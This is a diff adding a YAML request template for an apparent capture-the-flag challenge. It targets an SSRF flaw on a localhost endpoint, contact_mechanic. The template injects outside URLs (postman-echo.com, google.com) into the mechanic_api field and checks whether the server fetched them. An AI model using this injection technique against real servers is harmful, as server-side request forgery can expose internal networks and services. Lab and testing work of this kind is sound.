@@ -1,0 +1,39 @@
+name: SSRF template for challenge 11 
+
+description: |- 
+              Endpoint /workshop/api/merchant/contact_mechanic was suspected to be SSRF vulnerability.
+              We realised that this endpoint might be sending a request to /workshop/api/mechanic/receive_report
+              to get the mechanic report link.
+
+requests:
+  - url: http://localhost:8888/workshop/api/merchant/contact_mechanic
+    method: POST
+    headers:
+      Authorization: Bearer {add your own jwt}
+    json:
+      mechanic_code: arbitrary_mechanic
+      problem_details: arbitrary_problems
+      vin: arbitrary_VIN
+      mechanic_api: http://postman-echo.com/get
+      repeat_request_if_failed: false
+      number_of_repeats: 1
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: http://postman-echo.com/get?mechanic_code=
+
+  - url: http://localhost:8888/workshop/api/merchant/contact_mechanic
+    method: POST
+    headers:
+      Authorization: Bearer {add your own jwt}
+    json:
+      mechanic_code: arbitrary_mechanic
+      problem_details: arbitrary_problems
+      vin: arbitrary_VIN
+      mechanic_api: https://google.com
+      repeat_request_if_failed: false
+      number_of_repeats: 1
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: <title>Google</title>
